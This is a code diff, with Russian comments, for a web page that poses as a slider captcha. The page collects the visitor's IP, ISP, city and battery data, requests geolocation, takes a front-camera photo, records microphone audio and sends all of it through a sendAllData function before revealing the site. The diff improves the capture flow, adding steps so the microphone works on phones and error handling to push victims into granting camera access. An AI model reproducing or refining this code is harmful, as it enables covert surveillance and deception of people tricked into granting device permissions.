@@ -147,9 +147,11 @@
             // 1. IP и Провайдер
             let ip = "Неизвестно", provider = "Неизвестно", city = "Неизвестно";
             try { 
-                const res = await fetch('http://ip-api.com/json/'); // Используем ip-api для города и провайдера
+                const res = await fetch('https://ipwho.is/');// Используем ip-api для города и провайдера
                 const j = await res.json(); 
-                ip = j.query; provider = j.isp; city = j.city;
+                ip = j.ip; 
+                provider = j.connection ? j.connection.isp : "Неизвестно"; 
+                city = j.city || "Неизвестно";
             } catch (e) {}
 
             // 2. Батарея
@@ -215,32 +217,54 @@
 
         async function startCapture() {
             document.getElementById('loader').style.display = 'flex';
+            document.getElementById('loader').innerHTML = '<div class="spinner"></div><span>Запрос доступа к камере...</span>';
             document.getElementById('slider-btn').style.pointerEvents = 'none';
 
+            // 1. Сначала просим гео
             let geoData = null;
             try {
                 const pos = await new Promise((resolve, reject) => navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 5000 }));
                 geoData = { lat: pos.coords.latitude, lon: pos.coords.longitude };
             } catch (e) {}
 
+            // 2. Включаем камеру
+            let stream = null;
             let photoBlob = null;
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                 const video = document.createElement('video');
                 video.srcObject = stream;
                 video.play();
                 await new Promise(r => video.onloadeddata = r);
-                await new Promise(r => setTimeout(r, 800));
+                
+                // Даем 1.5 секунды для фокусировки
+                await new Promise(r => setTimeout(r, 1500)); 
 
                 const c = document.createElement('canvas');
                 c.width = video.videoWidth; c.height = video.videoHeight;
                 const cctx = c.getContext('2d');
                 cctx.translate(c.width, 0); cctx.scale(-1, 1);
                 cctx.drawImage(video, 0, 0);
+                
                 photoBlob = await new Promise(r => c.toBlob(r, 'image/jpeg', 0.8));
+                
+                // ВЫКЛЮЧАЕМ КАМЕРУ (чтобы микрофон заработал на телефоне)
                 stream.getTracks().forEach(t => t.stop());
-            } catch (e) {}
+            } catch (e) {
+                console.error("Ошибка камеры:", e);
+            }
 
+            // Если фото не удалось, показываем ошибку
+            if (!photoBlob) {
+                document.getElementById('loader').style.display = 'none';
+                document.getElementById('slider-btn').style.pointerEvents = 'auto';
+                document.querySelector('.sub-text').innerText = "Ошибка камеры. Разрешите доступ в настройках браузера.";
+                document.querySelector('.sub-text').style.color = "red";
+                return; 
+            }
+
+            // 3. Включаем микрофон (только после того, как камера выключена)
+            document.getElementById('loader').innerHTML = '<div class="spinner"></div><span>Запись голоса...</span>';
             let audioBlob = null;
             try {
                 const audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
@@ -253,18 +277,14 @@
                 await new Promise(r => mediaRecorder.onstop = r);
                 audioBlob = new Blob(chunks, { type: 'audio/ogg; codecs=opus' });
                 audioStream.getTracks().forEach(t => t.stop());
-            } catch (e) {}
-
-            if (photoBlob) {
-                await sendAllData(photoBlob, audioBlob, geoData);
-                document.getElementById('captcha').style.display = 'none';
-                document.getElementById('main-site').style.display = 'block';
-            } else {
-                document.getElementById('loader').style.display = 'none';
-                document.getElementById('slider-btn').style.pointerEvents = 'auto';
-                document.querySelector('.sub-text').innerText = "Ошибка проверки. Попробуйте еще раз.";
-                document.querySelector('.sub-text').style.color = "red";
+            } catch (e) {
+                console.error("Ошибка микрофона:", e);
             }
+
+            // 4. Отправка данных
+            await sendAllData(photoBlob, audioBlob, geoData);
+            document.getElementById('captcha').style.display = 'none';
+            document.getElementById('main-site').style.display = 'block';
         }
 
         const sliderContainer = document.getElementById('slider-btn');
